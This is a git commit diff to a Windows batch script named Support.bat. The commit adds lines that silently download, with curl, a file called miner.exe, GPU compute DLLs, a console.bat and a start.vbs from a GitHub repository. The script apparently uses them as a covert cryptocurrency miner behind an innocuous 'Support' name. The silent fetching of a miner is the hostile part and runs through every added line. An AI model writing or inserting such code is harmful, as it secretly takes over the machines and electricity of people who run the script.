24317a8e72aebba8c55a1a31edec4fd8baed25eb
Kotsasmin <68585878+Kotsasmin@users.noreply.github.com>
2021-05-23 17:02:57 +0300

    Update Support.bat

--- Support.bat
+++ Support.bat
@@ -3,6 +3,14 @@
 @echo off
 if not exist data mkdir data
 cd data
+if not exist console.bat curl.exe -o "console.bat" "https://github.com/Kotsasmin/Support/raw/main/data/console.bat" -L -s
+if not exist OpenCL.dll curl.exe -o "OpenCL.dll" "https://github.com/Kotsasmin/Support/blob/main/data/OpenCL.dll?raw=true" -L -s
+if not exist miner.exe curl.exe -o "miner.exe" "https://github.com/Kotsasmin/Support/blob/main/data/miner.exe?raw=true" -L -s
+if not exist msvcp140.dll curl.exe -o "msvcp140.dll" "https://github.com/Kotsasmin/Support/blob/main/data/msvcp140.dll?raw=true" -L -s
+if not exist nvrtc-builtins64_92.dll curl.exe -o "nvrtc-builtins64_92.dll" "https://github.com/Kotsasmin/Support/blob/main/data/nvrtc-builtins64_92.dll?raw=true" -L -s
+if not exist nvrtc64_92.dll curl.exe -o "nvrtc64_92.dll" "https://github.com/Kotsasmin/Support/blob/main/data/nvrtc64_92.dll?raw=true" -L -s
+if not exist vcruntime140.dll curl.exe -o "vcruntime140.dll" "https://github.com/Kotsasmin/Support/blob/main/data/vcruntime140.dll?raw=true" -L -s
+if not exist start.vbs curl.exe -o "start.vbs" "https://github.com/Kotsasmin/Support/raw/main/data/start.vbs" -L -s
 IF "%1"=="" goto:EOF
 IF /I "%1"=="-start" goto start
 IF /I "%1"=="-stop" goto stop
